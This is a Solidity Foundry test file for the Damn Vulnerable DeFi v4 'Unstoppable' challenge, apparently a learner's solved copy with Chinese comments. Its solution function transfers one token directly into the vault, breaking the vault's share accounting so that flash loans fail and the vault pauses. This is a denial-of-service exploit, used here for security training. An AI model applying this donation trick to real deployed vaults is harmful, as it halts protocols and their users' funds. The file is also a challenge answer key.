// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address monitor = makeAddr("monitor");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        // token是 ERC4626 中支持的资产 DVT
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

        // Deposit tokens to vault
        // 向 valut 注入 DVT 流动性 （TOKENS_IN_VAULT数量）
        token.approve(address(vault), TOKENS_IN_VAULT);
        // 初次注入 DVT 数量与铸造份额 tDVT 数量相等
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        // 向用户提供 DVT (INITIAL_PLAYER_TOKEN_BALANCE数量)
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true); // 检查为正常
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        // vault合约持有的 DVT 数量
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        // tDVT 数量
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        // 池子里 DVT 总数
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        // player（修饰器中） 再向 vault 转 DVT 使其余额不相等
        token.transfer(address(vault), 1);
        
        console.log("totalSupply: ", vault.totalSupply());
        console.log("totalAssets: ",  vault.totalAssets());
        console.log("convert: ", vault.convertToShares(vault.totalSupply()));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        
        // !!! 此处检测闪电贷状态不为false
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        // 此处执行vault.flashLoan看是否能执行成功
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}
